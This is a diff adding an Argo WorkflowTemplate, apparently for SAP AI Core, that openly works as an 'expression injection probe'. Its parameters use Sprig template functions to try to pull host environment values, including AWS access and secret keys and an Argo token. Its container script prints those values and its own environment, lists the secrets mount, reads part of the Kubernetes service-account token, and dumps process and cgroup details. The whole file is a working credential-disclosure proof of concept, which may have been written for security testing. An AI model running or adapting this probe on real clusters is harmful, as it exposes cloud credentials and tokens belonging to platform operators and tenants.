@@ -1,0 +1,93 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: argo-expr-probe
+  labels:
+    scenarios.ai.sap.com/id: "argo-expr-probe-scenario"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "argo-expr-probe-scenario"
+    executables.ai.sap.com/name: "argo-expr-probe"
+    executables.ai.sap.com/description: "argo expr injection test"
+spec:
+  entrypoint: probe
+  arguments:
+    parameters:
+    - name: param-sprig-env
+      value: '{{ env "PATH" }}'
+    - name: param-sprig-expandenv
+      value: '{{ expandenv "$HOME and $USER" }}'
+    - name: param-workflow-sa
+      value: '{{ workflow.serviceAccountName }}'
+    - name: param-workflow-ns
+      value: '{{ workflow.namespace }}'
+    - name: param-workflow-name
+      value: '{{ workflow.name }}'
+    - name: param-getenv
+      value: '{{ getenv "PATH" }}'
+    - name: param-sprig-pwd
+      value: '{{ env "PWD" }}'
+    - name: param-sprig-aws-access
+      value: '{{ env "AWS_ACCESS_KEY_ID" }}'
+    - name: param-sprig-aws-secret
+      value: '{{ env "AWS_SECRET_ACCESS_KEY" }}'
+    - name: param-sprig-token
+      value: '{{ env "ARGO_TOKEN" }}'
+    - name: param-sprig-namespace-env
+      value: '{{ env "ARGO_NAMESPACE" }}'
+    - name: param-host
+      value: '{{ env "HOSTNAME" }}'
+  templates:
+  - name: probe
+    container:
+      image: python:3.11-alpine
+      command: ["sh", "-c"]
+      args:
+      - |
+        echo "=== ARGO EXPRESSION INJECTION PROBE ==="
+        echo "[L01-sprig-env-PATH] $L01"
+        echo "[L02-sprig-expandenv] $L02"
+        echo "[L03-workflow-sa] $L03"
+        echo "[L04-workflow-ns] $L04"
+        echo "[L05-workflow-name] $L05"
+        echo "[L06-getenv-PATH] $L06"
+        echo "[L07-sprig-PWD] $L07"
+        echo "[L08-sprig-AWS-access] $L08"
+        echo "[L09-sprig-AWS-secret] $L09"
+        echo "[L10-sprig-ARGO-token] $L10"
+        echo "[L11-sprig-namespace] $L11"
+        echo "[L12-sprig-HOSTNAME] $L12"
+        echo "=== own pod env (control comparison) ==="
+        env | sort
+        echo "=== sa token mount check ==="
+        ls -la /var/run/secrets/ 2>&1 || echo "no secrets dir"
+        cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 100 || echo "no sa token"
+        echo "=== process info ==="
+        cat /proc/self/cgroup
+        cat /proc/1/cmdline | tr '\0' ' ' ; echo
+        echo "=== DONE ==="
+      env:
+      - name: L01
+        value: "{{workflow.parameters.param-sprig-env}}"
+      - name: L02
+        value: "{{workflow.parameters.param-sprig-expandenv}}"
+      - name: L03
+        value: "{{workflow.parameters.param-workflow-sa}}"
+      - name: L04
+        value: "{{workflow.parameters.param-workflow-ns}}"
+      - name: L05
+        value: "{{workflow.parameters.param-workflow-name}}"
+      - name: L06
+        value: "{{workflow.parameters.param-getenv}}"
+      - name: L07
+        value: "{{workflow.parameters.param-sprig-pwd}}"
+      - name: L08
+        value: "{{workflow.parameters.param-sprig-aws-access}}"
+      - name: L09
+        value: "{{workflow.parameters.param-sprig-aws-secret}}"
+      - name: L10
+        value: "{{workflow.parameters.param-sprig-token}}"
+      - name: L11
+        value: "{{workflow.parameters.param-sprig-namespace-env}}"
+      - name: L12
+        value: "{{workflow.parameters.param-host}}"
